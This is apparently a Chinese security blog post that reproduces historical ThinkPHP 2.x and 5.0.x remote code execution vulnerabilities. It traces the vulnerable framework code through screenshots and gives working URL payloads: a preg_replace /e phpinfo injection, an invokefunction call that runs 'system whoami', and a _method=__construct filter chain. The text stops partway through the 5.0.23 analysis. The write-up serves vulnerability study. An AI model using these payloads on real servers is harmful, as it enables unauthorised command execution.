---
title: 'ThinkPHP 框架历史漏洞复现'
description: 'ThinkPHP 2.x/3.x/5.x 历史版本漏洞复现笔记，涵盖 RCE、SQL 注入等常见漏洞的原理分析与利用方法。'
pubDate: 2024-07-27
author: 'IHK-1'
tags: ['ThinkPHP', '漏洞复现', 'RCE', 'SQL注入', 'Web安全']
---

# ThinkPHP 2.x RCE
```plain
影响范围：
 - ThinkPHP: 2.x 
 - PHP: <= 5.6.29
```

核心问题为 preg_replace 的 /e 修饰符存在恶意执行

全局搜索并参照参考文章定位问题在 /ThinkPHP/Lib/Think/Util/Dispatcher.class.php 的 

```plain
$res = preg_replace('@(\w+)'.$depr.'([^'.$depr.'\/]+)@e', '$var[\'\\1\']=strip_tags(\'\\2\');', implode($depr,$paths));
```

此代码在class Dispatcher extends Think 的 dispatch 中，根据该类的作用，是用于 URL映射到控制器 并分析 pathinfo信息



类的调用方法：[https://www.cnblogs.com/bushui/p/11690163.html](https://www.cnblogs.com/bushui/p/11690163.html)<!-- 这是一张图片，ocr 内容为：保存在S SERVERVERIPATH INFO.PHP/INDEX/INDEX/IOCALHOST/PATH INFO.PHP/INDEX/INDEX/INDEX/INDEX/INDEX/ ID 1; 那么在PATH INFO.PHP里面我就只写了一个例子 <?PHP ECHO $ SERVER['PATH INFO']; 会输出 /INDEX/INDEX/INDEX.HTML 这一段就是PATHINFO模式,去访问不存在的路径,会存在一个环境变量S SERVERRPATH INFO],后面的ID三1作为 $GET[ID]传入页面. PATHINFO的两种模式 访问\APPLICATION\INDEX\CONTROLLENDEX.PHP的TEST方法,下面这两种模式是相等的 1,HTTP://LOCALHOST/INDEX.PHP?MLEX&AA-TEST 2,HTTP://LOCALHOST/INDEX.PHP/LNDEX/TEST 四种路径访问模式 在CONFIG目录下边来做修改URL MODEL的值,分别表述如下: 1,值为0叫做普通模式.如:HTTP://OCALHOST/INDEX.PHP?M三模块&A三方法 叫做PATHINFO模式.如:HTTP://LOCALHOST/INDEX.PHP/模块/方法 2,值为1 3.值为2 叫做REWITE重写(伪静态)可以自己写相关的REWRITE规则,也可以使用系统为我们是供的REWRITE规则隐藏 掉INDEX.PHP,生成:HTTP://LOCALHOST/模块/方法 值为3 叫做聚合模式,当服务最上面不变持PATHNTO提式的时保,但是你又在之前的语式上面,全部用的 层PATHINTO符式,那么它会提示你赔径将式不正确.那么,你就可以用标号为3的兼容模式来处理.他的照径访可以 于HTTP://LOCALHOST/INDEX.PHP?S模块/方法 -->
![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1721794235347-49cbec3b-caca-4e80-9959-e17cb17fe4b8.png)

那么恶意执行中的$paths是可以自定义的，比如输入 index.php/a/b/c/d 即可输出 paths即为a/b/c/d，

注意看config.php的值确定对应的访问路径模式

<!-- 这是一张图片，ocr 内容为：THINKPHP 2.2 FULL > EXAMPLES CONFIG.PHP <?PHP 1 RETURN ARRAY 23456 MODEL'>1,//如果你的环境不支持PATHINFO 请设置为3 URL DB MYSQI TYPE 'DB HOST'S>'LO 'LOCALHOST', EXAMPLES' 'DB NAME' 7 'DB_USER'->'ROOT', 8 ,,,,AMD BA, 9 'DB PORT'>'3306', 'DB_PREFIX'>'THINK_', 10 11 APP DEBUG 1 12 13 -->
![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1721807368622-3e97ca67-7f59-4bd9-a186-ac2c2c1dc7c8.png)

已经知道了调用方法再次回看到恶意代码中

```plain
$res = preg_replace('@(\w+)'.$depr.'([^'.$depr.'\/]+)@e', '$var[\'\\1\']=strip_tags(\'\\2\');', implode($depr,$paths));

# 要搜索的字符：implode($depr,$paths)) 该参数可控，即为输入的 访问路径
# 匹配字符：preg_replace 会匹配多组 '@(\w+)'.$depr.'([^'.$depr.'\/]+)@e'，即输入a/b/c/d/e 输出 [ab] [cd] [e]
# 替换内容：'$var[\'\\1\']=strip_tags(\'\\2\');' 第一个匹配的值参数作为var数组的键 第二个值为var数组的值

代码上部分 array_shift 函数删除了模块和方法作为 var 的值，即 paths 从第三个开始
比如 a/b/c/d，a 和 b 已经被删除作为 var['VAR_MODULE'] 和 var['VAR_ACTION']，匹配的时候paths只有 c/d

其中preg_replace的/e方法会执行其的值：
比如path为 c/d ，则结果会执行 d

所以可以构造：
模块/方法/键/值（恶意执行代码）
```

构造 payload 如下：

```plain
在config.php URL_MODEL为 3 的情况下：
	?s=/index/index/xxxxx/${@phpinfo()}
```

# ThinkPHP 5.0.22/5.0.29 RCE
入口：index.php --> start.php --> app::run()

payload：

```plain
?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami
```

<!-- 这是一张图片，ocr 内容为：2 REFERENCES OVERRIDES NULL) PUBLIC STATIC FUNCTION RUN(REQUEST $REQUEST 三 T:INSTANCE $REQUEST - IS_NULL($REQUEST) ? REQUEST: $REQUEST; TRY F $CONFIG - SELF::INITCOMMON( //模块/控制器绑定 IF (DEFINED('BIND_MODULE')){ BIND MODULE && ROUTE::BIND(BIND MODULE); J ELSEIF ($CONFIG['AUTO_BIND_MODULE']){ //入口自动绑定 PATHINFO($REQUEST->BASEFILE(), PATHINFO_FILENAME); $NAME  IF ($NAME && 'INDEX' !- $NAL $NAME && IS_DIR(APP_PATH . $NAME)) ROUTE::BIND($NAME); $REQUEST->FILTER($CONFIG['DEFAULT_FILTER']); //默认语言 LANG::RANGE($CONFIG['DEFAULT_LANG']); //开启多语言机制检测当前语言 $CONFIG['LANG_SWITCH_ON'] && LANG::DETECT(); $REQUEST->LANGSET(LANG::RANGE()); //加载系统语言包 LANG:LOAD([ THINK PATH . 'LANG" . DS . $REQUEST->LANGSET() . EXT, APP_PATH . 'LANG' . DS . $REQUEST->LANGSET() . EXT, ]); // 监听 APP_DISPATCH HOOK::LISTEN('APP_DISPATCH', SELF::$DISPATCH); //获取应用调度信息 $DISPATCH - SELF::$DISPATCH; //未设置调度信息则进行 URL 路由检测 IF (EMPTY($DISPATCH)) { $DISPATCH - SELF::ROUTECHECK($REQUEST, $CONFIG); -->
![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1721995905869-05aa2f04-655d-49aa-a57b-de3fbff432ff.png)

跟进 routeCheck ，并对 url 分析

<!-- 这是一张图片，ocr 内容为：SAULIAAO         LAL PUBLIC STATIC FUNCTION ROUTECHECK($REQUEST, ARRAY $CONFIG) $PATH $REQUEST->PATH(); $CONFIG['PATHINFO_DEPR']; $DEPR $RESULT - FALSE; /路由检测 $CHECK - LIS_NULL(SELF::$ROUTECHECK) ? SELF::$ROUTECHECHECK : $CONFIG['URL ROUTE_ON']; IF ($CHECK) { //开启路由  IF (IS FILE(RUNTIME_PATH . 'ROUTE.PHP')) { //读取路由缓存 $RULES - INCLUDE RUNTIME PATH . 'ROUTE.PHP'; IS ARRAY($RULES) && ROUTE::RULES($RULES); ELSE | $FILES - $CONFIG['ROUTE_CONFIG_FILE'];  FOREACH ($FILES AS $FILE) { IF (IS FILE(CONF PATH . $FILE . CONF_EXT)){ //导入路由配置 $RULES - INCLUDE CONF PATH . $FILE . CONF EXT; IS_ARRAY($RULES) && ROUTE::IMPORT($RULES); /路由检测(根据路由定义返回不同的URL调度) $RESULT - ROUTE::CHECK($REQUEST, $PATH, $DEPR, $CONFIG['U G['URL_DOMAIN_DEPLOY']); S $CONFIG['URL_ROUTE_MUST']; $MUST  IF ($MUST && FALSE -- $RESULT) { //路由无效 THROW NEW ROUTENOTFOUNDEXCEPTION(); /路由无效解析模块/控制器/操作/参数.. 支持控制器自动搜索  IF (FALSE - $RE $RESULT) $RESULT - ROUTE::PARSEURL($PATH, $DEPR, $CONFIG('CONTROLLER AUTO_SEARCH']; $RESULT; -->
![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1721998010379-f0350a50-4127-4421-ac99-c24a868551f6.png)

跟进函数，输入 index/think\app/invokefunction，经过处理 $url = index|think\app|invokefunction，并进入 parseUrlPath

<!-- 这是一张图片，ocr 内容为：解析模块的URL地址[模块/控制器/操作]参数1-值1&参数2-值2... @ACCESS PUBLIC $URL URL地址 @PARAM STRING @PARAM STRING $DEPR URL分隔符 CH是否自动深度搜索控制器 $AUTOSEARCH @PARAM BOOL 水 @RETURN ARRAY */ 9 REFERENCES 10 OVERRIDES PUBLIC STATIC FUNCTION PARSEURL($URL, $DEPR - '/, $AUTOSEARCH - FALSE)  IF (ISSET(SELF::$BIND['MODULE']) T ', $DEPR, SELF::$BIND['MODULE']);  $BIND - STR_REPLACE('/', $DEPR //如果有模块/控制器绑定 D . ('.' !- SUBSTR($BIND, -1) ? $DEPR :'') . LTRIM($URL, $DEPR); $URL - $BIND . STR_REPLACE($DEPR, 'L', $URL); $URL  LIST($PATH, $VAR) - SELT SELF::PARSEURLPATH($URL); -->
![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1721998145865-4b3acca6-5d75-4824-bd7c-1b6453947819.png)

参考说明，发现此部分  index|think\app|invokefunction -->  index/think\app/invokefunction

其中处理时，控制器是有问题的，模块 index 控制器 think\app 操作为 invokefunction

<!-- 这是一张图片，ocr 内容为：4 REFERENCES PRIVATE STATIC FUNCTION PARSEURLPATH($URL) //分隔符替换 确保路由定义使用统一的分隔符 $URL - STR_REPLACE('L', '/', $URL);  $URL - TRIM($URL, '/'); $VAR - []; IF (FALSE !-- STRPOS($URL, '?')){ //[模块/控制器/操作?]参数1-值1&参数2-值2.. $INFO - PARSE_URL($URL); $PATH - EXPLODE('/', $INFO['PATH']); PARSE_STR($INFO['QUERY'], $VAR); } ELSEIF (STRPOS($URL, '/')) ( //[模块/控制器/操作]  $PATH - EXPLODE('/', $URL); J ELSE $PATH - [$URL]; RETURN [$PATH, $VAR]; -->
![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1721998257561-7dafc557-a169-4a32-871e-91983c611b4c.png)

返回 parseUrl中，观察控制器处理部分，控制器最后被封装并返回了

<!-- 这是一张图片，ocr 内容为：CLASS ROUTE N PARSEURL $DEPR $AUTOSEARCH FALSE) PUBLIC STATIC FUNCTION PAI $URL , , DS, $VAL) . $SUFFIX . EXT; DS $DIR $FILE STR REPLACE $FILE   PATHINFO($FI (SFILE, PATHINFO'DIRNANE) , DS , LOADER::: EXT; IF(IS_FILE($FILE)) $FIND - TRUE; BREAK; ELSE{ $DIR . DS . LOADER::PARSENAME($ ($VAL) ($FIND) $CONTROLLER IMPLODE( $ITEM) ARRAY SLICE($PATH, COUNT($ITEM)); $PATH ELSE F $CONTROLLER - ARRAY SHIFT($PATH); ELSEF //解析控制器 $CONTROLLER - LEMPTY($PATH) ? ARRAY SHIFT($PATH) : NULL; 解析操作 LEMPTY($PATH) ? ARRAY_SHIFT($PATH) : NULL; $ACTION 解析额外参数 //角 IMPLODE( ('L', $PATH)); (EMPTY($PATH) SELF::PARSEURLPARAMS 1/封装路由 [$MODULE, $CONTROLLER, $ACTION]; $ROUTE //检查地址是否被定义过路由 " - $ACTION); PHALLE - SUI COJUWCI PRNNOMD $NAME2 IF (EMPTY($MODULE) LL ISSET($BIND) & $MODULE -- $BIND) $NAME2 - STRTOLOWER(LOADER::PARSENAME($CONTROLLER, 1) .'/' . ' . $ACTION); ISSET(SELF::$RULES['NAME'][$NAME2])) { (ISSET(SELF::$RULES['NAME'][$NAME]) THROW NEW HTTPEXCEPTION(404, 'INVALID R VALID REQUEST:' . STR REPLACE('L'L', $DEPR, $URL)); 'MODULE', 'MODULE' -> $ROUTEL; I'TYPE RETURN -->
![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1721998650688-5e45e9f1-243c-4a50-b115-2898459aa8df.png)

返回 app::run 中，返回的$dispatch被exec函数处理，$dispatch 的moudle 为 $route 

<!-- 这是一张图片，ocr 内容为：未设置调度信息则进行URL路由检测 IF (EMPTY($DISPATCH)) - SELF::ROUTECHECK($REQUEST, $CONFIG); $DISPATCH 记录当前调度信息 $REQUEST->DISPATCH($DISPATCH); //记录路由和请求信息 IF (SELF::$DEBUG){ VAR_EXPORT($DISPATCH, TRUE), 'INFO'); LOG::RECORD('[ ROUTE ] E), 'INFO');  LOG::RECORD([[ HEADER ] VAR_EXPORT($REQUEST->HEADER(), TRUE), 'IN LOG::RECORD('[ PARAM VAR_EXPORT($REQUEST->PARAM(), TRUE), 'INFO'); 子 // 监听 APP_BEGIN HOOK::LISTEN('APP_BEGIN', $DISPATCH); 请求缓存检查 $REQUEST->CACHE( $CONFIG['REQUEST_CACHE'], $CONFIG['REQUEST_CACHE_EXPIRE'], $CONFIG['REQUEST_CACHE_EXCEPT'] $DATA - SELF::EXEC($DISPATCH, $CONFIG); CATCH (HTTPRESPONSEEXCEPTION $EXCEPTION) { $DATA - $EXCEPTION->GETRESPONSE(); 连衣米的应刷 -->
![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1721998812647-3be8fedf-5c1e-4273-8788-63f2711d762b.png)

跟进exec

<!-- 这是一张图片，ocr 内容为：EXEC($DISPATCH, $CONFIG)  PROTECTED STATIC FUNCTION A 子  SWITCH ($DISPATCH['TYPE'])  CASE'REDIRECT'://重定向跳转 $DATA - RESPONSE::CREATE($DISPATCH['URL'], 'REDIRECT') ->CODE($DISPATCH['STATUS']); BREAK: 'MODULE'://模块/控制器/操作 CASE $DATA - SELF::MODULE( $DISPATCH['MODULE ], $CONFIG, $DISPATCH['CONVERT'] : NULL ISSET($DISPATCH['CONVERT']) BREAK; -->
![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1721999120086-e55dbae5-d795-4097-a1e3-17e4470b0c99.png)

继续跟进module

<!-- 这是一张图片，ocr 内容为：REFERENCE U OVERRIDES PUBLIC STATIC FUNCTION MODULE($RESULT, $CONFIG, $CONVERT - NULL) IF (IS_STRING($RESULT)) { EXPLODE('/', $RESULT); $RESULT -->
![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1721999367251-5e9d6bb3-d13a-4cd0-9956-a0dab361446b.png)

该部分处理结果：

```plain
result[0] = index
result[1] = think\app
reslut[2] = invokefunction
```

继续分析 result[1] 的部分，发现传递到 $controller ，invokefunction 也被传递到 $actionName<!-- 这是一张图片，ocr 内容为：铁牧控制品 $CONTROLLER - STRIP TAGS($RESULT[1] ?: $CONFIG['DEFAULT_CONTROLLER']; $CONTROLLER - $CONVERT ? STRTOLOWER($CONTROLLER) : $CONTROLLER; 获取操作名 - STRIP TAGS($RESULT[2] ?: $CONFIG['DEFAULT ACTION'] $ACTIONNAME - STLE -->
![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1721999687844-7971534c-0325-4a44-b754-7ddae1b83cdc.png)

继续向下分析，结合上面处理部分，可以分析出其意思为新建并执行 think\app 下的 invokefunction 方法

<!-- 这是一张图片，ocr 内容为：TRY F LOADER:CONTROLLER( $INSTANCE $CONTROLLER, $CONFIG['URL_ 1_CONTROLLER_LAYER'], $CONFIG['CONTROLLER_SUFFIX'], $CONFIG['EMPTY_CONTROLLER'] ); (CLASSNOTFOUNDEXCEPTION $E) { CATCH THROW NEW HTTPEXCEPTION(404, 'CONTROLLER NOT EXISTS:' . $E->GETCLASS(); //获取当前操作名 $ACTION - $ACTIONNAME . $CONFIG['ACTION_SUFFIX']; $VARS - []; IF (IS_CALLABLE([$INSTANCE, $ACTION])) 1 //执行操作方  $CALL - [$INSTANCE, $ACTION]; //严格获取当前操作方法名 $REFLECT - NEW \REFLECTIONMETHOD($INSTANCE, $ACTION); $METHODNAME - $REFLECT->GETNAME(); $CONFIG['ACTION_SUFFIX']; $SUFFIX $ACTIOHNAME - $SUFFIX ? SUBSTR($METHODNAME, O, -STRLEN($SUFFIX)) : $METHODNAME; $REQUEST->ACTION($ACTIONNAME); ELSEIF (IS CALLABLE([$INSTANCE, '_EMPTY'])) { 空操作  $CALL - [$INSTANCE, _EMPTY']; $VARS - [$ACTIONNAME]; ELSE //操作不存在 , $ACTION . '()'); THROW NEW HTTPEXCEPTION(404, 'METHOD NOT EXISTS:' . GET CLASS($INSTANCE) 了 HOOK::LISTEN('ACTION_BEGIN', $CALL); RETURN SELF::INVOKEMETHOD($CALL, $VARS) -->
![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1722000285418-9486119f-f012-4de9-bde1-cb86bf3a9c29.png)

继续分析 invokeMethod 和 payload中传参的数据 function=call_user_func_array&vars[0]=system&vars[1][]=whoami，bindParams 会获取这个反射的参数

<!-- 这是一张图片，ocr 内容为：O OVERRIDES O REFERENCES BUBLIC STATIC FUNCTION INVOKEMETHOD($METHOD, $VARS (1) IF (IS ARRAY($METHOD)) ? $METHOD[E] : SELF::INVOKECLASS($METHOD[E]); IS OBJECT($METHOD[O]) $CLASS - NEW \REFLECTIONMETHOD($CLASS, $METHOD[1]); $REFLECT ELSE 静态方法 $REFLECT - NEW \REFLECTIONMETHOD($METHOD); $ARGS - SELF::BINDPARAMS($REFLECT, $VARS); - '[ ' . $REFLECT->GETFILENAME() .' ]', 'INFO'); $REFLECT->CLASS SELF::$DEBUG && LOG::RECORD([ RUN ] $REFLECT->NAME RETURN $REFLECT->INVOKEARGS(ISSET($CLASS) ? $CLASS : NULL, $ARGS); -->
![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1722000646157-82773390-25f7-4828-9914-365989ebe00e.png)

如下

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1722001325093-ce21f932-223f-41ad-b7f1-c6067e02cc79.png)

这个函数为获取参数，即payload的 function=call_user_func_array&vars[0]=system&vars[1][]=whoami

InvokeArgs 让其将该参数当作列表传递给 invokefunction 中，继续分析 invokefunction，bindParams 会获取这个反射的 参数

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1722001519819-87ecb59a-9b57-4fb4-bcdf-6a995baa2ea0.png)

传递的 function 被反射执行

即 call_user_func_array("system", "whoami")

# ThinkPHP 5.0.23 RCE
```plain
影响范围
 - ThinkPHP: <= 5.0.23
```

根据官方 更新日志 改进 Request 类的 method 方法

<!-- 这是一张图片，ocr 内容为：10 REFERENCES|0 OVERRIDES '', $DEFAULT - NULL, $FILTER  PUBLIC FUNCTION $NAME $DATA INPUT IF (FALSE -- $NAME) //获取原始数据 RETURN $DATA; (STRING) $NAME; $NAME - $NAME) IF //解析NAME ]((./. IF (STRPOS($NAME, LIST($NAME, $TYPE) - EXPLODE('/', $NAME) ELSE $TYPE - 'S'; /按.拆分成多维数组进行判断 DE('.', $NAME) AS $VAL) { FOREACH (EXPLODE(' (ISSET($DATA[$VAL]) { IF $DATA $DATA[$VAL]; LELSE 1/无输入数据,返回黑犬认值 $DEFAULT; RETURN $ IF (IS_OBJECT($DATA)) { RETURN $DATA; -->
![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1721813988035-62d3de1f-791f-42e1-b2e6-48450e03a60d.png)

关于method的利用：当 method 方法为 false 时，会传参给 method属性 为 POST的 _method 的值

<!-- 这是一张图片，ocr 内容为：18 RETERENCES OVERNOES - FALSE) FUNCTION METHOD($METHOD PUBLIC F 子 IF(TRUESSSMETHOD) 1/获取原始请求类型 (ISSET(STHIS-SSERVERT'REQUEST METHOO ') ? STHIS->SERVERVER['REQUEST METHOD'] S S S SERVER[ METHOD'T); RETURN IS CLI ? GET': (!$THIS->METHOD) { ELSEIF IF (ISSET($ POST[CONFIG::GET('VAR METHOD')]) { $THIS->METHOD - STRTOUPPER($ POST(CONFIG::GET('VAR-METHOD')]; $THIS->{$THIS->METHOD}($_POST); A ELSEIF (ISSET($ SERVER['HTTP X HTTP METHOD OVERRIDE']) { $THIS->METHOD - STRTOUPPER($ SERVERVER['HTTP X HTTP METHOD OVERRIDE'L); ELSE F $THIS->METHOD - IS CLI ? 'GET' : (ISSET($THIS->SERVER['REQUEST METHOD'] $THIS->SERVER['REQUEST METHOD'] : $ SERVER['REQUEST_METHOD']);  RETURN $THIS->METHOD; -->
![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1721817798034-96e8b6e5-4711-46b7-8588-9f13735bf226.png)

<!-- 这是一张图片，ocr 内容为：URL DOMAIN DEPLOY TALSE //域名根,如THINKPHP.CN 'URL DOMAIN ROOT' //是否自动转换URL中的控制器和操作名 'URL CONVERT' 三> TRUE, //默认的访问控制器层 'URL CONTROLLER LAYER' 三> 'CONTROLLER', 1/表单请求类型伪装变量 METHOD' 'VAR METHOD' 1/表单AJAX伪装变量 'VAR AJAX' AJAX", //表单PJAX伪装变量 三> '_PJAX', 'VAR_PJAX' -->
![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1721818135596-856b2406-f6dc-4bf4-a152-44a70207760f.png)

然可以传参给以 _method 为名的类 POST 传参的值为属性，其中 __construct 类可以任意自定义类属性

<!-- 这是一张图片，ocr 内容为：ADURAO  01 SBOURLAL O CONSTRUCT($OPTIONS PROTECTED FUNCTION ($OPTIONS AS $NAME - $ITEM) FOREACH (PROPERTY_EXISTS($THIS, $NAME)) { IF $ITEM; $THIS->$NAME FILTER IF BTHIS IS NULL LTER - CONFIG::GET('DEFAULT_FILTER'); $THIS->FILTER // 保存 PHP://INPUT - FILE_GET_CONTENTS('PHP://INPUT'); $THIS->INPUT -->
![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1721818023483-87482caa-2458-4f77-8694-0490a0f99a27.png)

即POST传参 _method=__construct 后可以随意POST传参属性给类，例如 test=a

当前类中还有一个 call_user_func 函数在filterValue方法中

<!-- 这是一张图片，ocr 内容为：4 REFERENCES FILTERVALUE(&$VALUE, $KEY, $FILTERS) PRIVATE FUNCTION $DEFAULT - ARRAY_POP($FILTERS);  FOREACH ($FILTERS AS $FILTER) { IF (IS_CALLABLE($FILTER)){ 1/调用承数或者方法过滤 $VALUE - CALL_USER_FUNC($FILTER, $VALUE); ELSEIF(IS_SCALAR($VALUE)) IF (FALSE ! - STRPOS($FILTER, '/')) { //正则过滤 IF (!PREG_MATCH($FILTER, $VALUE)) //匹配不成功返回默认值 $VALUE - $DEFAULT; BREAK; } ELSEIF (!EMPTY($FILTER)){ //FILTER函数不存在时,则使用FILTER_VAR进行过滤 // FILTER为非整形值时,调用FILTER_ID取得过滤ID : FILTER_ID($FILTER)); $VALUE - FILTER VAR($VALUE, IS INT($FILTER) ? $FILTER  IF (FALSE - $VALUE) { $VALUE - $DEFAULT; BREAK; RETURN $THIS->FILTEREXP($VALUE); -->
![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1721820292796-adc6c866-85c8-416d-8fb2-f4b2abbb1479.png)

其触发方法： 传参 value=执行参数，key为空，filters[]=执行函数

filterValue方法在input方法中调用

<!-- 这是一张图片，ocr 内容为：10 REFERENCES |0 OVERRIDES [], $DEFAULT - NULL, $FILTER PUBLIC INPUT($DATA FUNCTION $NAME IF (FALSE $NAME //获取原始数据 RETURN $DATA; (STRING) $NAME; $NAME  IF (" !- $NAME) { //解析NAME IF (STRPOS($NAME, '/')) { LIST($NAME, $TYPE) - EXPLODE('/', $NAME); ELSE F $TYPE /按.拆分成多维数组进行判断 ('.', $NAME) AS $VAL) { FOREACH (EXPLODE('.  IF (ISSET($DATA[$VAL]) { $DATA - $DATA[$VAL]; ELSE{ 1/无输入数据,返回默认值 RETURN $DEFAULT; F (IS_OBJECT($DATA)){ RETURN $DATA; J //解析过滤器 $FILTER - $THIS->GETFILTER($FILTER, $DEFAULT); IF (IS_ARRAY($DATA)) { ARRAY WALK RECURSIVE($DATA, [$THIS, 'FILTERVALUE'], $FILTER)] RESET($DATA); ELSE $THIS->FILTERVALUE($DATA, $NAME, $FILTER); $DEFAULT) ( IF &&$DATA ISSET($TYPE) //强制类型转换 $THIS->TYPECAST($DATA, $TYPE); RETURN $DATA; -->
![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1721820353108-a58a80d1-79e5-4277-a1fc-310e6d075e97.png)

触发方法：data=执行参数（字符串），name为空，filters[]=执行函数，其中 filters若为空由 getFilter在 属性中获取，因此还是可以根据 method 方法任意给类属性赋值，无需在input中传参 filters，getFilter会自动在属性值获取，所以触发方法为：data=执行参数（字符串），name为空，filters为空

<!-- 这是一张图片，ocr 内容为：OVERRIDES REFERENCES ER, $DEFAULT) PROTECTED FUNCTION GETFILTER($FILTER, $D IF (IS_NULL($FILTER)){ $FILTER - []; $FILTER - $FILTER ?: $THIS->FILTER; ]((/.. STRPOS($FILTER, IT (15 SLRING(PTILER) & TAISE $FILTER) $FILTER - EXPLODE(', ELSE $FILTER -ARRAY) $FILTER; $FILTER[] - $DEFAULT; $FILTER; RETURN -->
![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1721824446054-d73668e0-4da3-4ea1-ac2e-1ec33371a364.png)

inptut方法在 param 中调用

<!-- 这是一张图片，ocr 内容为：13 REFERENCES |0 OVERRIDES  NULL, $FILTER $DEFAULT PUBLIC FUNCTION PARAM($NAME IF (EMPTY($THIS->PARAM)){ $METHOD - $THIS->METHOD(TRUE); 1/自动获取请求变量 SWITCH ($METHOD) CASE 'POST': $VARS - $THIS->POST(FALSE); BREAK; CASE 'PUT': DELETE: CASE CASE PATCH': $VARS - $THIS->PUT(FALSE); BREAK; DEFAULT: $VARS /当前请求参数和URL地址中的参数合并 $THIS->PARAM - ARRAY_MERGE($THIS->GET(FALSE), $VARS, $THIS->ROUTE(FALSE)); IF (TRUE $NAME) //获取包含文件上传信息的数组  $FILE - $THIS->FILE(); $THIS-PARAM; $DATA - IS ARRAY($FILE) ? ARRAY MERGE($THIS->PARAM, $FILE) $DEFAULT,$FILTER); RETURN $THIS->INPUT($DATA, RETURN $THIS->INPUT($THIS->PARAM, $NAME, $DEFAULT, $FILTER); -->
![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1721820629769-f2491bbd-d6ca-442b-b28c-a16e192ae4d2.png)

触发方法：param=执行参数（字符串），name为空，filters为空

由于param属性被合并

<!-- 这是一张图片，ocr 内容为：AME - '', $DEFAULT - NULL, $FILTER - PUBLIC FUNCTION PARAM $NAME IF (EMPTY($THIS->PARAM) $METHOD - $THIS->METHOD(TRUE) //自动获取请求变量 ($METHOD) F SWITCH CASE 'POST':  $VARS - $THIS->POST(FALSE); BREAK; 'PUT': CASE DELETE: CASE PATCH': CASE  $VARS - $THIS->PUT(FALSE); BREAK; DEFAULT: $VARS 子 当前清求参数和BL MIRL地址中的参数会并 ; ARRAY MERGE($THIS->GET(FALSE), $VARS, $THIS->ROUTE(FALSE)) $THIS-PARAM IF (TRUE -- $NAME) //获取包含文件上传信息的数组 $FILE - $THIS->FILE(); $DATA - IS_ARRAY($FILE) ? ARRAY_MERGE($THIS->PARAM, $FILE) : $THIS->PARAM; $DEFAULT, $FILTER); $THIS->INPUT($DATA, RETURN RETURN $THIS->INPUT($THIS->PARAM, $NAME, $DEFAULT, $FILTER); -->
![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1721820799577-9614de33-2202-4a69-bcab-f3dd7b505f4f.png)

因此param属性还可以通过get和route进行传递，因此触发方法有以下几种

a. param=执行参数（字符串），name为空，filters为空

b. get=执行参数（字符串），name为空，filters为空

c. route=执行参数（字符串），name为空，filters为空

结合method方法，可以任意给get，route数学赋值，再调用 param 即可RCE任意命令执行



method 方法的调用：thinkphp\library\think\Route.php 的 check 方法

<!-- 这是一张图片，ocr 内容为：PUBLIC STATIC FUNCTION ROUTECHECK($REQUEST, ARRAY $CONFIG) $REQUEST->PATH(); $PATH $CONFIG['PATHINFO_DEPR']; $DEPR $RESULT - FALSE; /路由检测 $CHECK - LIS_NULL(SELF::$ROUTECHECK) ? SELF::$ROUTECHECHECK : $CONFIG['URL ROUTE_ON']; IF ($CHECK) //开启路由  IF (IS_FILE(RUNTIME_PATH . 'ROUTE.PHP')) { 1/读取路由缓存 $RULES - INCLUDE RUNTIME_PATH . 'ROUTE.PHP'; IS_ARRAY($RULES) && ROUTE::RULES($RULES); ELSE $FILES - $CONFIG['ROUTE_CONFIG_FILE']; FOREACH ($FILES AS $FILE){ IF (IS_FILE(CONF_PATH . $FILE . CONF_EXT)){ //导入路由配置 $RULES - INCLUDE CONF PATH . $FILE . CONF EXT; IS_ARRAY($RULES) & ROUTE::IMPORT($RULES); 子 致山龄测?根据败由定义返同不同的LI调度) : ROUTE::CHECK($REQUEST, $PATH, $DEPR, $CONFIG['URL_DOMAIN DEPLOY']); GRESULT L 3SUW AINOI TIN (8RUOCT : 2SUMAINO.TTAS ; (ISUWEINONT : LTAS TINU S SNILLT -->
![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1721822431456-6d44ac4a-825a-4158-a2a7-b8c55f0cb17a.png)

routecheck方法在app::run() 中触发

<!-- 这是一张图片，ocr 内容为：2 REFERENCES|0 OVERRIDES PUBLIC STATIC FUNCTION RUN(REQUEST $REQUEST NULL) 三 了 REQUEST::INSTANCE $REQUEST - IS_NULL($REQUEST) CE(): $REQUEST; TRY F $CONFIG - SELF:INITCOMMON( //模块/控制器绑定 IF (DEFINED('BIND_MODULE')) { BIND MODULE && ROUTE::BIND(BIND MODULE); } ELSEIF ($CONFIG['AUTO_BIND_MODULE']){ 入口自动绑定 $NAME - PATHINFO($REQUEST->BASEFILE(), PATHINFO FILENAME); I- $NAME && IS DIR(APP PATH . $NAME)){ IF ($NAME & INDEX' ROUTE::BIND($NAME); $REQUEST->FILTER($CONFIG['DEFAULT_FILTER']); 1/默认语言 LANG::RANGE($CONFIG['DEFAULT_LANG']); //开启多语言机制检测当前语言 $CONFIG['LANG_SWITCH_ON'] & LANG::DETECT(); $REQUEST->LANGSET(LANG::RANGE()); //加载系统语言包 LANG::LOAD([ ATH . 'LANG' . DS . $REQUEST->LA T->LANGSET() . EXT, THINK PATH , 'LANG' . DS . $REQUEST->LANGSET() . EXT, APP PATH 1); // 监听 APP_DISPATCH HOOK::LISTEN('APP_DISPATCH' SELF::$DISPATCH) 